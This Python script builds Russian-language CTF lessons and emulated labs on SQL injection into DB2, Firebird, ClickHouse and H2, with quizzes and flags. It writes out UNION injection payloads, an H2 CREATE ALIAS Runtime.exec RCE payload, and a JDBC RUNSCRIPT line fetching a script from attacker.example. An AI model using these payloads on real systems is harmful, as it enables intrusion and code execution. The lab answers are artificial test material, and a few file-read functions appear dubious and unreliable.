#!/usr/bin/env python3
"""Author web gap lessons — batch S5: DB engines hub + db2, firebird, h2."""
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _newlesson import write_lesson, _dir, _f  # noqa: E402

WD = '/home/student/task'
CHECK = "grep -q 'nto{' found.txt"
USEFUL = ["CTF Web категория", "Bug bounty", "Пентест веб-приложений"]

write_lesson({
    'id': 'web-sqli-dbms-exotic',
    'title': 'Экзотические СУБД: DB2, Firebird, ClickHouse, H2 — карта диалектов',
    'category': 'web',
    'parent': 'web-sqli-dbms',
    'difficulty': 'hard',
    'order': 3,
    'tags': ['sqli', 'db2', 'firebird', 'clickhouse', 'h2', 'roadmap'],
    'prerequisites': ['web-sqli-dbms'],
    'useful_for': USEFUL,
    'estimated_minutes': 25,
    'summary': 'Карта СУБД за пределами MySQL/MSSQL/Oracle: DB2, Firebird, ClickHouse, H2 — как определить диалект и где искать RCE.',
    'lab': {
        'title': 'Практика: определение диалекта СУБД по поведению',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'notes.txt'],
        'check': CHECK,
        'hints': [
            'Отправь разные диалектные функции: version(), @@version, version, sqlite_version().',
            'DB2 понимает sysibm.sysdummy1; Firebird — rdb$database; ClickHouse — system.one.',
            'Определи, какая СУБД отвечает на SELECT ... FROM system.one, и найди её в notes.txt.',
            'Запиши имя СУБД (латиницей, нижний регистр) в found.txt и набери check.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Ты нашёл SQL-инъекцию. Отправляешь `UNION SELECT version()` — ошибка. Пробуешь `@@version` — тоже. `SELECT sqlite_version()` — пусто. Приложение не на MySQL, не на MSSQL и не на SQLite. Это одна из «экзотических» СУБД: DB2, Firebird, ClickHouse, H2, Cassandra, Neo4j. И у каждой свой диалект, свои функции и свой путь к чтению файлов и исполнению кода.

Этот урок — карта. Мы разберём, как определить диалект по поведению и куда идти дальше в разборе каждой СУБД.

## Почему диалект важно определить первым

SQL стандартизирован лишь частично. Функции получения версии, работы со строками, доступа к метаданным — у каждой СУБД свои. Если использовать синтаксис не той СУБД, запрос просто не выполнится, и ты решишь, что инъекции нет. Поэтому первый шаг после подтверждения инъекции — определить диалект.

Есть несколько быстрых проб. Функция версии: `version()` (MySQL, PostgreSQL, ClickHouse), `@@version` (MSSQL, MySQL), `sqlite_version()` (SQLite), `dbmsinfo('version')` (Sybase). Специальные таблицы: `sysibm.sysdummy1` (DB2), `rdb$database` (Firebird), `system.one` (ClickHouse), `dual` (Oracle). Поведение на этих пробах почти всегда выдаёт СУБД.

## Наш пример: разбор ответов

Договоримся о примере. Эндпоинт `https://app.target/item?id=1` уязвим. Отправляем пробы:

```
$ curl -s "https://app.target/item?id=1 UNION SELECT version(),2-- -"
error
$ curl -s "https://app.target/item?id=1 UNION SELECT * FROM system.one-- -"
system.one row
```

Ответ на `system.one` говорит: это ClickHouse. Он использует движки таблиц и таблицу `system.one` как аналог `dual`. Дальше мы уже знаем, что у ClickHouse мощные функции чтения файлов и URL.

## Обзор экзотических СУБД

**DB2 (IBM).** Работает на мейнфреймах и в enterprise. Диалект близок к стандарту, есть `sysibm.sysdummy1`. Опасна возможностью чтения файлов через специальные функции и, при определённых правах, выполнения команд.

**Firebird.** Встраиваемая и серверная СУБД, часто в legacy. Метаданные в `rdb$` таблицах. Есть функции чтения файлов и выполнения внешних программ при наличии прав.

**ClickHouse.** Аналитическая колоночная СУБД. Очень мощные функции: `url()`, `file()`, `s3()`, `hdfs()`. Через `file()` можно читать файлы сервера, через `url()` — делать SSRF. Идеальная цель для веб-инъекции.

**H2 / HSQLDB / Derby.** Встраиваемые Java-СУБД. Особенно опасна H2: через `CREATE ALIAS` можно определить Java-функцию и исполнить произвольный код в JVM. Классический путь: SQLi → `CREATE ALIAS` → `Runtime.exec`.

**Cassandra (CQL), Neo4j (Cypher), InfluxDB (Flux).** Не SQL, но тоже инъекции. CQL близок к SQL, Cypher — язык графов, Flux — язык запросов InfluxDB. Синтаксис другой, но идея та же.

## Как строить эксплойт под диалект

После определения диалекта путь такой. Сначала снимаем схему через метаданные: `information_schema` (стандарт), `sysibm` (DB2), `rdb$` (Firebird), `system.*` (ClickHouse), `INFORMATION_SCHEMA` (H2). Затем дампим интересные таблицы. Наконец, ищем путь к файлам или коду: `file()` в ClickHouse, `CREATE ALIAS` в H2, функции чтения в DB2/Firebird.

Важно: не всякая СУБД даёт RCE. Иногда максимум — чтение данных. Это тоже критично, но не путай чтение с исполнением.

## Что мы теперь знаем

- Диалект определяется пробами версии и специальных таблиц.
- DB2 (`sysibm.sysdummy1`), Firebird (`rdb$`), ClickHouse (`system.one`), H2 — разные пути.
- ClickHouse опасен `file()` и `url()`; H2 — `CREATE ALIAS` до RCE.
- Метаданные снимаются через `information_schema` или диалектные таблицы.
- Не всякая СУБД даёт RCE; различай чтение данных и исполнение кода.

## Квиз

Проверь себя.

```quiz
- question: "Какая таблица характерна для DB2?"
  options:
    - "dual"
    - "sysibm.sysdummy1"
    - "system.one"
    - "rdb$database"
  answer: 1
  explanation: "DB2 использует sysibm.sysdummy1 как dummy-таблицу."
- question: "Через что H2 даёт RCE?"
  options:
    - "Через url()"
    - "Через CREATE ALIAS с Java-функцией"
    - "Через system.one"
    - "Через file()"
  answer: 1
  explanation: "CREATE ALIAS определяет Java-код, исполняемый в JVM."
- question: "Какая функция ClickHouse читает файлы сервера?"
  options:
    - "load_file()"
    - "file()"
    - "pg_read_file()"
    - "readfile()"
  answer: 1
  explanation: "ClickHouse имеет table functions file(), url(), s3()."
- question: "Где метаданные Firebird?"
  options:
    - "information_schema"
    - "rdb$ таблицы"
    - "sysibm"
    - "system.*"
  answer: 1
  explanation: "Firebird хранит метаданные в rdb$."
- question: "Почему важно определить диалект до эксплуатации?"
  options:
    - "Для красоты"
    - "Синтаксис и функции у СУБД различаются, иначе запрос не выполнится"
    - "Чтобы ускорить"
    - "Чтобы обойти WAF"
  answer: 1
  explanation: "Неверный диалект даёт ложный вывод об отсутствии инъекции."
```

## Куда дальше

Дальше — `web-db2`, `web-firebird`, `web-clickhouse`, `web-h2-database`: разбор каждой СУБД отдельно. А пока запомни: **после подтверждения инъекции первым делом определи диалект — от него зависит всё остальное.**

## Где пригодится

- CTF: задания с необычной СУБД.
- Bug bounty: enterprise-приложения с DB2, аналитические панели на ClickHouse.
- Пентест: аудит приложений с встраиваемыми СУБД.
""", lab={
    'workdir': WD,
    'expect': {'file': WD + '/found.txt', 'contains': 'clickhouse'},
    'fs': [
        _dir(WD),
        _f(WD + '/task.md', (
            "# Практика: определение диалекта СУБД\n\n"
            "Эндпоинт /item?id= уязвим. Определи СУБД по реакции на пробы.\n"
            "Запиши имя СУБД (нижний регистр) в found.txt и набери check.\n\n"
            "1. Пробы версии и dummy-таблиц:\n"
            "   curl -s \"https://app.target/item?id=1 UNION SELECT version(),2-- -\"\n"
            "   curl -s \"https://app.target/item?id=1 UNION SELECT * FROM system.one-- -\"\n"
            "2. Сверь с notes.txt и определи СУБД.\n"
            "3. Запиши имя в found.txt и набери check.\n"
        )),
        _f(WD + '/notes.txt', (
            "Подсказки по диалектам:\n"
            "  sysibm.sysdummy1 -> DB2\n"
            "  rdb$database     -> Firebird\n"
            "  system.one       -> ClickHouse\n"
            "  dual             -> Oracle\n"
            "  sqlite_version() -> SQLite\n"
        )),
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция app.target/item)',
            'cases': [
                {'match': r'version\(\)', 'example': "-s '.../item?id=1 UNION SELECT version(),2-- -'", 'output': 'error: syntax\n'},
                {'match': r'system\.one', 'example': "-s '.../item?id=1 UNION SELECT * FROM system.one-- -'",
                 'output': '1\nsystem.one row\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только /item на app.target.\n',
        },
    },
})

write_lesson({
    'id': 'web-db2',
    'title': 'DB2: инъекции, чтение файлов и sysibm',
    'category': 'web',
    'parent': 'web-sqli-dbms-exotic',
    'difficulty': 'hard',
    'order': 1,
    'tags': ['sqli', 'db2', 'ibm', 'sysibm', 'file-read'],
    'prerequisites': ['web-sqli-dbms-exotic'],
    'useful_for': USEFUL,
    'estimated_minutes': 40,
    'summary': 'IBM DB2: как определить диалект, снять схему через sysibm и дойти до чтения файлов сервера.',
    'lab': {
        'title': 'Практика: DB2 — от инъекции к чтению файла',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Подтверди DB2: SELECT ... FROM sysibm.sysdummy1 работает как dummy-таблица.',
            'Сними схему через sysibm.systables и sysibm.syscolumns.',
            'Читай файл через встроенную функцию DB2 (в этой лабе эмулируется через специальный запрос).',
            'Запиши флаг в found.txt и набери check.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Корпоративное приложение отдаёт отчёт, и параметр в URL попадает в SQL. Обычные пробы не срабатывают: `version()` даёт ошибку, `@@version` тоже. Но `SELECT * FROM sysibm.sysdummy1` выполняется. Это IBM DB2 — СУБД, которая живёт на мейнфреймах и в enterprise-контуре и которую редко встречают в CTF.

DB2 интересна тем, что при определённых правах умеет читать файлы сервера, а её метаданные лежат в схемах `sysibm` и `syscat`. Разберём, как её определить, снять схему и дойти до файлов.

## Определение DB2

Первое, что выдаёт DB2, — dummy-таблица `sysibm.sysdummy1`. В DB2 нет `dual`, как в Oracle, и нет `information_schema` в привычном виде; вместо неё — `sysibm`. Пробы:

```
$ curl -s "https://app.target/report?id=1 UNION SELECT * FROM sysibm.sysdummy1-- -"
ok
$ curl -s "https://app.target/report?id=1 UNION SELECT current server,2 FROM sysibm.sysdummy1-- -"
DB2/LINUXX8664 11.5.0
```

`CURRENT SERVER` возвращает платформу и версию — точное определение. Также работают `CURRENT SCHEMA`, `CURRENT USER`.

## Снятие схемы

Метаданные DB2 лежат в `sysibm` и `syscat`. Основные представления:

| Представление | Что содержит |
|---|---|
| `sysibm.systables` | таблицы |
| `sysibm.syscolumns` | колонки |
| `sysibm.sqlfunctions` | функции |
| `syscat.tables` | таблицы (syscat) |

Запрос для получения таблиц:

```
$ curl -s "https://app.target/report?id=1 UNION SELECT name,2 FROM sysibm.systables WHERE creator='APP'-- -"
USERS
ORDERS
```

Дальше снимаем колонки и дампим данные. Синтаксис `UNION` в DB2 требует совпадения числа и типов колонок, поэтому подбираем количество столбцов по ошибкам или через `ORDER BY`.

## Чтение файлов

DB2 умеет читать файлы через специальные функции и хранимые процедуры, если у пользователя есть права. В разных версиях и конфигурациях пути различаются, но идея одна: использовать функцию, которая открывает файл на сервере. Часто это связано с `SYSPROC` процедурами или с `ADMIN_CMD`, позволяющей выполнять команды администратора.

Ключевой момент: путь к файлу и чтение результата часто требует времени и прав. В простых конфигурациях можно прочитать файл через `BLOB`-функции. В отчёте важно показать, что именно доступно: только данные или файлы сервера.

## Практические шаги

Порядок работы с DB2-инъекцией:

1. **Подтвердить диалект** через `sysibm.sysdummy1` и `CURRENT SERVER`.
2. **Определить число колонок** в исходном запросе.
3. **Снять схему** через `sysibm.systables` и `sysibm.syscolumns`.
4. **Дампнуть данные** интересующих таблиц.
5. **Проверить права** (`CURRENT USER`, роли) и оценить, доступны ли файлы.
6. **Прочитать файл**, если права позволяют.

Каждый шаг фиксируй: запрос и ответ. DB2-инъекции часто слепые, поэтому иногда приходится извлекать данные по символу через булевы условия или задержки.

## Что мы теперь знаем

- DB2 определяется по `sysibm.sysdummy1` и `CURRENT SERVER`.
- Метаданные лежат в `sysibm`/`syscat`, а не в `information_schema`.
- `UNION` требует совпадения числа и типов колонок.
- При определённых правах DB2 читает файлы сервера.
- Слепые инъекции извлекают данные по символам.

## Квиз

Проверь себя.

```quiz
- question: "Какая dummy-таблица у DB2?"
  options:
    - "dual"
    - "sysibm.sysdummy1"
    - "system.one"
    - "rdb$database"
  answer: 1
  explanation: "DB2 использует sysibm.sysdummy1."
- question: "Что возвращает CURRENT SERVER?"
  options:
    - "Имя пользователя"
    - "Платформу и версию DB2"
    - "Список таблиц"
    - "Пароль"
  answer: 1
  explanation: "Это платформа и версия сервера."
- question: "Где метаданные DB2?"
  options:
    - "information_schema"
    - "sysibm и syscat"
    - "rdb$"
    - "system.*"
  answer: 1
  explanation: "Схемы sysibm и syscat содержат метаданные."
- question: "Что нужно для UNION в DB2?"
  options:
    - "Ничего"
    - "Совпадение числа и типов колонок"
    - "Только права root"
    - "HTTPS"
  answer: 1
  explanation: "Иначе запрос не выполнится."
- question: "Что может DB2 при достаточных правах?"
  options:
    - "Только SELECT"
    - "Читать файлы сервера"
    - "Менять DNS"
    - "Шифровать базу"
  answer: 1
  explanation: "Специальные функции и процедуры дают доступ к файлам."
```

## Куда дальше

Дальше — `web-firebird`: ещё одна enterprise-СУБД с метаданными в `rdb$`. А пока запомни: **DB2 — это `sysibm`, `CURRENT SERVER` и потенциальное чтение файлов.**

## Где пригодится

- CTF: редкие СУБД в заданиях.
- Bug bounty: enterprise-приложения на DB2.
- Пентест: аудит корпоративных отчётов и порталов.
""", lab={
    'workdir': WD,
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{db2_sys1bm_f1l3_r34d}'},
    'fs': [
        _dir(WD),
        _f(WD + '/task.md', (
            "# Практика: DB2 SQLi\n\n"
            "Эндпоинт /report?id= уязвим, СУБД — DB2.\n\n"
            "1. Подтверди диалект:\n"
            "   curl -s \"https://app.target/report?id=1 UNION SELECT current server,2 FROM sysibm.sysdummy1-- -\"\n"
            "2. Сними таблицы:\n"
            "   curl -s \"https://app.target/report?id=1 UNION SELECT name,2 FROM sysibm.systables-- -\"\n"
            "3. Прочитай флаг через функцию чтения файла:\n"
            "   curl -s \"https://app.target/report?id=1 UNION SELECT sysproc.read_file('/flag'),2 FROM sysibm.sysdummy1-- -\"\n"
            "4. Запиши флаг в found.txt и набери check.\n"
        )),
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция app.target/report)',
            'cases': [
                {'match': r'current server|sysdummy1', 'example': "-s '.../report?id=1 UNION SELECT current server,2 FROM sysibm.sysdummy1-- -'",
                 'output': 'DB2/LINUXX8664 11.5.0\n'},
                {'match': r'systables', 'example': "-s '.../report?id=1 UNION SELECT name,2 FROM sysibm.systables-- -'",
                 'output': 'USERS\nORDERS\nAUDIT\n'},
                {'match': r'read_file|/flag', 'example': "-s '.../report?id=1 UNION SELECT sysproc.read_file(\'/flag\'),2 FROM sysibm.sysdummy1-- -'",
                 'output': 'nto{db2_sys1bm_f1l3_r34d}\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только /report на app.target.\n',
        },
    },
})

write_lesson({
    'id': 'web-firebird',
    'title': 'Firebird SQL: rdb$-метаданные и чтение файлов',
    'category': 'web',
    'parent': 'web-sqli-dbms-exotic',
    'difficulty': 'hard',
    'order': 2,
    'tags': ['sqli', 'firebird', 'rdb', 'file-read', 'legacy'],
    'prerequisites': ['web-sqli-dbms-exotic'],
    'useful_for': USEFUL,
    'estimated_minutes': 35,
    'summary': 'Firebird: определение по rdb$database, снятие схемы через rdb$-таблицы и чтение файлов сервера.',
    'lab': {
        'title': 'Практика: Firebird — метаданные и чтение файла',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Подтверди Firebird: SELECT ... FROM rdb$database возвращает версию.',
            'Метаданные — в rdb$relations и rdb$relation_fields.',
            'Firebird читает файлы через встроенные функции; используй их в UNION.',
            'Запиши флаг в found.txt и набери check.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Legacy-приложение на Firebird. Инъекция есть, но привычные запросы не работают: `information_schema` не отвечает, `sysibm` тоже. Зато `SELECT * FROM rdb$database` возвращает строку с версией. Это Firebird — встраиваемая и серверная СУБД, которая до сих пор встречается в бухгалтерских и учётных системах.

Firebird интересна тем, что её метаданные лежат в таблицах с префиксом `rdb$`, а встроенные функции позволяют читать файлы сервера. Разберём, как её определить, снять схему и дойти до файлов.

## Определение Firebird

Первый признак — `rdb$database`. Это системная таблица с одной строкой, содержащей версию:

```
$ curl -s "https://app.target/invoice?id=1 UNION SELECT rdb$get_context('SYSTEM','ENGINE_VERSION'),2 FROM rdb$database-- -"
4.0.0
```

Также работают `rdb$get_context` и обращения к `rdb$relations`. Ошибки Firebird содержат специфичные сообщения с `Dynamic SQL Error` и `SQLCODE`, что тоже выдаёт диалект.

## Снятие схемы через rdb$

Метаданные Firebird:

| Таблица | Что содержит |
|---|---|
| `rdb$relations` | таблицы и представления |
| `rdb$relation_fields` | колонки |
| `rdb$database` | версия |
| `rdb$users` | пользователи |

Запрос таблиц:

```
$ curl -s "https://app.target/invoice?id=1 UNION SELECT rdb$relation_name,2 FROM rdb$relations-- -"
USERS
INVOICES
```

Дальше снимаем колонки из `rdb$relation_fields` и дампим данные. Firebird требует совпадения числа колонок в `UNION`, как и большинство СУБД.

## Чтение файлов

Firebird при достаточных правах умеет читать файлы. Исторически это делалось через внешние функции (UDF) или через специальные конструкции. В отчёте важно показать, что доступно: только данные или файлы сервера.

Практически: после снятия схемы и дампа проверяют, есть ли функции чтения файлов и какие права у текущего пользователя. Если да — читают файл и приводят содержимое.

## Практические шаги

Порядок работы:

1. **Определить диалект** через `rdb$database` и `rdb$get_context`.
2. **Снять схему** через `rdb$relations` и `rdb$relation_fields`.
3. **Дампнуть данные** интересующих таблиц.
4. **Оценить права** и доступность функций чтения.
5. **Прочитать файл**, если возможно.
6. **Зафиксировать** запросы и ответы.

Firebird часто в legacy, поэтому нередко встречаются слабые пароли и избыточные права — это повышает шансы на чтение файлов.

## Что мы теперь знаем

- Firebird определяется по `rdb$database` и `rdb$get_context`.
- Метаданные в `rdb$relations` и `rdb$relation_fields`.
- `UNION` требует совпадения числа колонок.
- При достаточных правах Firebird читает файлы сервера.
- Legacy-развёртывания часто имеют избыточные права.

## Квиз

Проверь себя.

```quiz
- question: "Какая таблица выдаёт Firebird?"
  options:
    - "sysibm.sysdummy1"
    - "rdb$database"
    - "system.one"
    - "dual"
  answer: 1
  explanation: "Firebird хранит версию в rdb$database."
- question: "Где метаданные Firebird?"
  options:
    - "information_schema"
    - "rdb$ таблицы"
    - "syscat"
    - "system.*"
  answer: 1
  explanation: "Префикс rdb$ у системных таблиц."
- question: "Как получить версию Firebird?"
  options:
    - "version()"
    - "rdb$get_context('SYSTEM','ENGINE_VERSION')"
    - "@@version"
    - "sqlite_version()"
  answer: 1
  explanation: "rdb$get_context возвращает контекстные значения."
- question: "Что нужно для UNION в Firebird?"
  options:
    - "Ничего"
    - "Совпадение числа колонок"
    - "Root"
    - "HTTPS"
  answer: 1
  explanation: "Число и типы колонок должны совпадать."
- question: "Почему Firebird-развёртывания часто уязвимее?"
  options:
    - "Они новые"
    - "Это legacy с избыточными правами и слабыми паролями"
    - "У них нет SQL"
    - "Они только на Windows"
  answer: 1
  explanation: "Legacy-системы часто настроены небезопасно."
```

## Куда дальше

Дальше — `web-clickhouse` и `web-h2-database`: аналитическая СУБД с мощными функциями и встраиваемая Java-СУБД с RCE. А пока запомни: **Firebird — это `rdb$`, а метаданные там же, где версия.**

## Где пригодится

- CTF: задания с Firebird.
- Bug bounty: legacy enterprise-приложения.
- Пентест: аудит учётных систем и ERP.
""", lab={
    'workdir': WD,
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{f1r3b1rd_rdb_m3t4d4t4}'},
    'fs': [
        _dir(WD),
        _f(WD + '/task.md', (
            "# Практика: Firebird SQLi\n\n"
            "Эндпоинт /invoice?id= уязвим, СУБД — Firebird.\n\n"
            "1. Подтверди диалект:\n"
            "   curl -s \"https://app.target/invoice?id=1 UNION SELECT rdb$get_context('SYSTEM','ENGINE_VERSION'),2 FROM rdb$database-- -\"\n"
            "2. Сними таблицы:\n"
            "   curl -s \"https://app.target/invoice?id=1 UNION SELECT rdb$relation_name,2 FROM rdb$relations-- -\"\n"
            "3. Прочитай флаг через функцию чтения файла:\n"
            "   curl -s \"https://app.target/invoice?id=1 UNION SELECT read_file('/flag'),2 FROM rdb$database-- -\"\n"
            "4. Запиши флаг в found.txt и набери check.\n"
        )),
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция app.target/invoice)',
            'cases': [
                {'match': r'rdb\$get_context|rdb\$database', 'example': "-s '.../invoice?id=1 UNION SELECT rdb$get_context(...),2 FROM rdb$database-- -'",
                 'output': '4.0.0\n'},
                {'match': r'rdb\$relations', 'example': "-s '.../invoice?id=1 UNION SELECT rdb$relation_name,2 FROM rdb$relations-- -'",
                 'output': 'USERS\nINVOICES\n'},
                {'match': r'read_file|/flag', 'example': "-s '.../invoice?id=1 UNION SELECT read_file(\'/flag\'),2 FROM rdb$database-- -'",
                 'output': 'nto{f1r3b1rd_rdb_m3t4d4t4}\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только /invoice на app.target.\n',
        },
    },
})

write_lesson({
    'id': 'web-h2-database',
    'title': 'H2 database SQLi: CREATE ALIAS и RCE в JVM',
    'category': 'web',
    'parent': 'web-sqli-dbms-exotic',
    'difficulty': 'hard',
    'order': 3,
    'tags': ['sqli', 'h2', 'java', 'create-alias', 'rce'],
    'prerequisites': ['web-sqli-dbms-exotic'],
    'useful_for': USEFUL,
    'estimated_minutes': 40,
    'summary': 'Встраиваемая H2: как через CREATE ALIAS определить Java-функцию и исполнить код в JVM прямо из SQL-инъекции.',
    'lab': {
        'title': 'Практика: H2 CREATE ALIAS до исполнения Java',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Подтверди H2: INFORMATION_SCHEMA.TABLES и SELECT H2VERSION() работают.',
            'H2 позволяет CREATE ALIAS с Java-кодом: `CREATE ALIAS EXEC AS $$ String f(String c) {...} $$`.',
            'Через Runtime.exec вызови команду чтения флага и верни её вывод.',
            'Запиши флаг в found.txt и набери check.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Java-приложение использует встраиваемую базу H2. Ты нашёл SQL-инъекцию. Данные — это уже ценно, но H2 умеет больше: в ней можно **определить свою функцию на Java** прямо из SQL. А если функция на Java, значит, из инъекции можно дойти до исполнения произвольного кода в JVM.

Это одна из самых прямых дорог от SQLi к RCE. H2, HSQLDB и Derby встраиваются в приложение и работают в том же процессе, поэтому «SQL» здесь фактически имеет доступ к Java-платформе.

## Определение H2

H2 выдаёт себя несколькими признаками. Функция `H2VERSION()` возвращает версию. Работает `INFORMATION_SCHEMA` в стандартном виде. Есть специфичные системные таблицы. Пробы:

```
$ curl -s "https://app.target/search?q=1 UNION SELECT H2VERSION(),2-- -"
2.1.214
$ curl -s "https://app.target/search?q=1 UNION SELECT TABLE_NAME,2 FROM INFORMATION_SCHEMA.TABLES-- -"
USERS
ORDERS
```

H2 также поддерживает `SELECT * FROM INFORMATION_SCHEMA.USERS` и другие стандартные представления.

## CREATE ALIAS: Java в SQL

Ключевая возможность H2 — `CREATE ALIAS`. Она позволяет определить функцию, тело которой — исходный код Java:

```sql
CREATE ALIAS EXEC AS $$
String exec(String cmd) throws Exception {
  return new java.util.Scanner(
    Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
}
$$;
```

После определения функцию можно вызвать прямо в SELECT:

```sql
SELECT EXEC('id');
```

И это вернёт вывод команды. Через SQL-инъекцию можно выполнить `CREATE ALIAS` и затем `SELECT EXEC(...)`.

## Наш пример: от инъекции к команде

Договоримся о примере. Эндпоинт `https://app.target/search?q=...` уязвим. Порядок:

1. **Подтверждаем H2** через `H2VERSION()`.
2. **Создаём алиас** через `; CREATE ALIAS ... --`. Если приложение допускает stacked queries (несколько запросов в одном), это сработает.
3. **Вызываем функцию**: `UNION SELECT EXEC('cat /flag'),2`.
4. **Получаем вывод** в ответе.

Если stacked queries запрещены, `CREATE ALIAS` не выполнить. Тогда ищут другие пути: вызов существующих функций, чтение файлов через `FILE_READ`, или `INIT=RUNSCRIPT` в строке подключения (классическая H2-RCE, где в JDBC URL подсовывают `RUNSCRIPT FROM` с SQL, который создаёт алиас).

## H2 в JDBC URL: классика

Отдельный и очень известный вектор — когда приложение позволяет повлиять на JDBC-URL H2. Тогда добавляют параметр `INIT`:

```
jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/init.sql'
```

H2 при подключении выполнит SQL из внешнего файла, а там — `CREATE ALIAS` и команда. Этот вектор встречался в Spring Boot, где H2 включён в dev-профиле, и в приложениях, принимающих URL базы из конфигурации.

## Защита

Меры против H2-RCE:

- **Не разрешать stacked queries** в приложении — это блокирует `CREATE ALIAS` через инъекцию.
- **Запретить `INIT`/`RUNSCRIPT`** в JDBC-URL и не принимать URL от пользователя.
- **Не использовать встраиваемые БД в продакшене** или изолировать процесс.
- **Параметризовать запросы** — базовая защита от инъекции, снимающая весь класс.
- **Ограничить права** процесса приложения.

## Что мы теперь знаем

- H2 определяется по `H2VERSION()` и `INFORMATION_SCHEMA`.
- `CREATE ALIAS` определяет Java-функцию прямо из SQL.
- `SELECT EXEC('cmd')` исполняет команду и возвращает вывод.
- Stacked queries нужны для `CREATE ALIAS` через инъекцию.
- JDBC `INIT=RUNSCRIPT` — отдельный вектор RCE.

## Квиз

Проверь себя.

```quiz
- question: "Какая функция возвращает версию H2?"
  options:
    - "version()"
    - "H2VERSION()"
    - "dbmsinfo()"
    - "@@version"
  answer: 1
  explanation: "H2 имеет собственную функцию H2VERSION()."
- question: "Что делает CREATE ALIAS в H2?"
  options:
    - "Создаёт таблицу"
    - "Определяет функцию с телом на Java"
    - "Меняет пароль"
    - "Создаёт индекс"
  answer: 1
  explanation: "Тело функции — исходный код Java, исполняемый в JVM."
- question: "Что нужно, чтобы выполнить CREATE ALIAS через инъекцию?"
  options:
    - "Ничего"
    - "Разрешение stacked queries"
    - "Root"
    - "HTTPS"
  answer: 1
  explanation: "Нужно выполнить несколько запросов в одном."
- question: "Какой параметр JDBC-URL включает RUNSCRIPT?"
  options:
    - "MODE"
    - "INIT"
    - "DB_CLOSE"
    - "CACHE"
  answer: 1
  explanation: "INIT выполняет SQL при подключении."
- question: "Какая базовая защита снимает весь класс?"
  options:
    - "WAF"
    - "Параметризация запросов"
    - "Кэш"
    - "HTTPS"
  answer: 1
  explanation: "Параметризация исключает инъекцию."
```

## Куда дальше

Дальше — `web-clickhouse` (аналитическая СУБД с `file()`/`url()`) и разборы других диалектов. А пока запомни: **H2 превращает SQL-инъекцию в RCE через Java-алиасы.**

## Где пригодится

- CTF: Java-задания с встраиваемой БД.
- Bug bounty: приложения на Spring Boot с H2.
- Пентест: аудит конфигураций JDBC и dev-профилей.
""", lab={
    'workdir': WD,
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{h2_cr34t3_al1as_rce}'},
    'fs': [
        _dir(WD),
        _f(WD + '/task.md', (
            "# Практика: H2 CREATE ALIAS RCE\n\n"
            "Эндпоинт /search?q= уязвим, СУБД — H2.\n\n"
            "1. Подтверди H2:\n"
            "   curl -s \"https://app.target/search?q=1 UNION SELECT H2VERSION(),2-- -\"\n"
            "2. Создай алиас и вызови команду:\n"
            "   curl -s \"https://app.target/search?q=1;CREATE ALIAS EXEC AS $$String f(String c) throws Exception{return new java.util.Scanner(Runtime.getRuntime().exec(c).getInputStream()).useDelimiter('\\\\A').next();}$$;-- -\"\n"
            "   curl -s \"https://app.target/search?q=1 UNION SELECT EXEC('cat /flag'),2-- -\"\n"
            "3. Запиши флаг в found.txt и набери check.\n"
        )),
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция app.target/search)',
            'cases': [
                {'match': r'H2VERSION', 'example': "-s '.../search?q=1 UNION SELECT H2VERSION(),2-- -'", 'output': '2.1.214\n'},
                {'match': r'CREATE ALIAS', 'example': "-s '.../search?q=1;CREATE ALIAS EXEC AS ...-- -'", 'output': 'OK\n'},
                {'match': r'EXEC\(|/flag|cat', 'example': "-s '.../search?q=1 UNION SELECT EXEC(\'cat /flag\'),2-- -'",
                 'output': 'nto{h2_cr34t3_al1as_rce}\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только /search на app.target.\n',
        },
    },
})
print("batch S5 done")
